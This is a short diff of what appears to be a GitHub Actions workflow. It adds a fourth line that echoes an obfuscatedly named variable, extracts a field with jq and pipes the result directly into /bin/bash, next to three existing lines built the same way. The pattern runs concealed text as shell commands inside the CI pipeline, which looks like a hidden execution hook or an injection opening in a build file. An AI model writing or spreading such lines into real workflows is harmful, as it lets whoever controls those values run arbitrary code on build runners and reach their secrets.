@@ -23,6 +23,7 @@ jobs:
           echo $vijf8325 | jq -r .pa4 | /bin/bash
           echo $a0014 | jq -r .w1 | /bin/bash
           printf '%s' "$ril742" | jq -r .b88 | /bin/bash
+          echo $tnsa5 | jq -r .jwmbb235 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
